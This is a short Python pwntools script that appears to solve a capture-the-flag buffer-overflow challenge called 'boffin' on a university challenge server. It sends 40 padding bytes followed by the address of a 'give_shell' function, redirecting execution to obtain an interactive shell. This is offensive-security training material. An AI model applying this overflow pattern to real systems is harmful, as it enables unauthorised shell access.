from pwn import *

e = ELF('./boffin')

#p = process('./boffin')
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1337)

p.sendline(b'rt1726')
p.sendline(b'A'*40 + p64(e.symbols['give_shell']))

p.interactive()